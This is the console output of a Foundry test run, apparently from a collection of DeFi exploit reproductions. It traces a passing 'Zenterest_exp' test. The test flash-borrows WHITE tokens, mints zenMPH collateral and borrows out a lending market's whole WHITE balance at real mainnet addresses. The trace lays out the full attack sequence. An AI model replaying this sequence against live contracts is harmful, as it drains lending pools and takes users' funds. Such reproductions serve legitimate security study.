Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-08/Zenterest_exp.sol:13:5:
   |
13 |     Uni_Pair_V3 Pool = Uni_Pair_V3(0xC5c134A1f112efA96003f8559Dba6fAC0BA77692);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2123:1:
     |
2123 | interface Pool {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20453)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20453] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 309.08ms (101.72Вµs CPU time)

Ran 1 test for src/test/2024-08/Zenterest_exp.sol:ContractTest
[PASS] testExploit() (gas: 599946)
Traces:
  [657746] ContractTest::testExploit()
    в”њв”Ђ [0] VM::prank(0x90744C976F69c7d112E8Fe85c750ACe2a2c16f15)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [29996] MPH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 23200000000000000000000 [2.32e22])
    в”‚   в”њв”Ђ emit Transfer(from: 0x90744C976F69c7d112E8Fe85c750ACe2a2c16f15, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 23200000000000000000000 [2.32e22])
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [612432] Pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 85000000000000000000 [8.5e19], 0, 0x)
    в”‚   в”њв”Ђ [2467] WHITE::balanceOf(Pool: [0xC5c134A1f112efA96003f8559Dba6fAC0BA77692]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 2857932458550351828128 [2.857e21]
    в”‚   в”њв”Ђ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Pool: [0xC5c134A1f112efA96003f8559Dba6fAC0BA77692]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 8783201251326246893244 [8.783e21]
    в”‚   в”њв”Ђ [28067] WHITE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 85000000000000000000 [8.5e19])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: Pool: [0xC5c134A1f112efA96003f8559Dba6fAC0BA77692], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 85000000000000000000 [8.5e19])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [551174] ContractTest::uniswapV3FlashCallback(8500000000000000 [8.5e15], 0, 0x)
    в”‚   в”‚   в”њв”Ђ [76842] unitroller::enterMarkets([0x4dD6D5D861EDcD361455b330fa28c4C9817dA687])
    в”‚   в”‚   в”‚   в”њв”Ђ [71641] 0x94e388d6410A40C36cde41A7AD8e60A820B5971a::enterMarkets([0x4dD6D5D861EDcD361455b330fa28c4C9817dA687]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit MarketEntered(rToken: zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [0]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [0]
    в”‚   в”‚   в”њв”Ђ [24562] MPH::approve(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [8096] MPH::transfer(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], 2000000000000000000000 [2e21])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], value: 2000000000000000000000 [2e21])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [144274] zenMPH::mint(21200000000000000000000 [2.12e22])
    в”‚   в”‚   в”‚   в”њв”Ђ [556] MPH::balanceOf(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2130237755166997669234 [2.13e21]
    в”‚   в”‚   в”‚   в”њв”Ђ [10708] 0x80De5040D956DD5C367ec96007a94B466A90e993::getBorrowRate(2130237755166997669234 [2.13e21], 13727872740358540479927 [1.372e22], 9099862609485483779018 [9.099e21]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000041fe886bbf2
    в”‚   в”‚   в”‚   в”њв”Ђ emit AccrueInterest(cashPrior: 2130237755166997669234 [2.13e21], interestAccumulated: 363551936324124492992751 [3.635e23], borrowIndex: 293358035573459765971 [2.933e20], totalBorrows: 377279809064483033472678 [3.772e23])
    в”‚   в”‚   в”‚   в”њв”Ђ [45072] unitroller::mintAllowed(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21200000000000000000000 [2.12e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [44392] 0x94e388d6410A40C36cde41A7AD8e60A820B5971a::mintAllowed(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21200000000000000000000 [2.12e22]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2553] zenMPH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit DistributedSupplierComp(param0: zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 518829395491649734500035689431620112869576930979 [5.188e47])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [556] MPH::balanceOf(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2130237755166997669234 [2.13e21]
    в”‚   в”‚   в”‚   в”њв”Ђ [556] MPH::balanceOf(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2130237755166997669234 [2.13e21]
    в”‚   в”‚   в”‚   в”њв”Ђ [6059] MPH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], 21200000000000000000000 [2.12e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], value: 21200000000000000000000 [2.12e22])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], value: 115792089237316195423570985008687907853269984665640564018257584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [556] MPH::balanceOf(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23330237755166997669234 [2.333e22]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 21200000000000000000000 [2.12e22], mintTokens: 751165871214 [7.511e11])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 751165871214 [7.511e11])
    в”‚   в”‚   в”‚   в”њв”Ђ [1038] unitroller::mintVerify(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21200000000000000000000 [2.12e22], 751165871214 [7.511e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [425] 0x94e388d6410A40C36cde41A7AD8e60A820B5971a::mintVerify(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21200000000000000000000 [2.12e22], 751165871214 [7.511e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”њв”Ђ [467] WHITE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 85000000000000000000 [8.5e19]
    в”‚   в”‚   в”њв”Ђ [8167] WHITE::transfer(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], 85000000000000000000 [8.5e19])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], value: 85000000000000000000 [8.5e19])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [36082] zenWHITE::accrueInterest()
    в”‚   в”‚   в”‚   в”њв”Ђ [467] WHITE::balanceOf(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 89909548652799303712 [8.99e19]
    в”‚   в”‚   в”‚   в”њв”Ђ [2708] 0x80De5040D956DD5C367ec96007a94B466A90e993::getBorrowRate(89909548652799303712 [8.99e19], 1527196719891618044551 [1.527e21], 904050326548776043426 [9.04e20]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000047bad3bfbe7
    в”‚   в”‚   в”‚   в”њв”Ђ emit AccrueInterest(cashPrior: 89909548652799303712 [8.99e19], interestAccumulated: 44669194037861804814844 [4.466e22], borrowIndex: 293702201847555535997 [2.937e20], totalBorrows: 46196390757753422859395 [4.619e22])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”њв”Ђ [467] WHITE::balanceOf(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 89909548652799303712 [8.99e19]
    в”‚   в”‚   в”њв”Ђ [226175] zenWHITE::borrow(89909548652799303712 [8.99e19])
    в”‚   в”‚   в”‚   в”њв”Ђ [145356] unitroller::borrowAllowed(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89909548652799303712 [8.99e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [144676] 0x94e388d6410A40C36cde41A7AD8e60A820B5971a::borrowAllowed(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89909548652799303712 [8.99e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit MarketEntered(rToken: zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9078] 0x47D748C9BAbD5cCa642F9f98e07442C0B5b04d2f::getUnderlyingPrice(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3056] zenWHITE::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "zenWHITE"
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [426] zenWHITE::underlying() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] WHITE: [0x5F0E628B693018f639D10e4A4F59BD4d8B2B6B44]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 66570137662599764 [6.657e16]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5667] zenMPH::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [556] MPH::balanceOf(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23330237755166997669234 [2.333e22]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 751165871214 [7.511e11], 0, 28222794475109390118782771529 [2.822e28]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9078] 0x47D748C9BAbD5cCa642F9f98e07442C0B5b04d2f::getUnderlyingPrice(zenMPH: [0x4dD6D5D861EDcD361455b330fa28c4C9817dA687]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3056] zenMPH::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "zenMPH"
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [426] zenMPH::underlying() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] MPH: [0x8888801aF4d980682e47f1A9036e589479e835C5]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 944836858607953 [9.448e14]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9578] zenWHITE::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [467] WHITE::balanceOf(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 89909548652799303712 [8.99e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0, 0, 0, 26204447932880747707996955515 [2.62e28]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5078] 0x47D748C9BAbD5cCa642F9f98e07442C0B5b04d2f::getUnderlyingPrice(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1056] zenWHITE::symbol() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] "zenWHITE"
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [426] zenWHITE::underlying() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] WHITE: [0x5F0E628B693018f639D10e4A4F59BD4d8B2B6B44]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 66570137662599764 [6.657e16]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [365] zenWHITE::borrowIndex() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 293702201847555535997 [2.937e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [467] WHITE::balanceOf(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 89909548652799303712 [8.99e19]
    в”‚   в”‚   в”‚   в”њв”Ђ [23267] WHITE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89909548652799303712 [8.99e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 89909548652799303712 [8.99e19])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 89909548652799303712 [8.99e19], accountBorrows: 89909548652799303712 [8.99e19], totalBorrows: 46286300306406222163107 [4.628e22])
    в”‚   в”‚   в”‚   в”њв”Ђ [983] unitroller::borrowVerify(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89909548652799303712 [8.99e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [376] 0x94e388d6410A40C36cde41A7AD8e60A820B5971a::borrowVerify(zenWHITE: [0xE3334e66634acF17B2b97ab560ec92D6861b25fa], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89909548652799303712 [8.99e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”њв”Ђ [3367] WHITE::transfer(Pool: [0xC5c134A1f112efA96003f8559Dba6fAC0BA77692], 85008500000000000000 [8.5e19])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pool: [0xC5c134A1f112efA96003f8559Dba6fAC0BA77692], value: 85008500000000000000 [8.5e19])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [467] WHITE::balanceOf(Pool: [0xC5c134A1f112efA96003f8559Dba6fAC0BA77692]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 2857940958550351828128 [2.857e21]
    в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Pool: [0xC5c134A1f112efA96003f8559Dba6fAC0BA77692]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 8783201251326246893244 [8.783e21]
    в”‚   в”њв”Ђ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 85000000000000000000 [8.5e19], param3: 0, param4: 8500000000000000 [8.5e15], param5: 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.50s (6.74s CPU time)

Ran 2 test suites in 7.51s (7.81s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
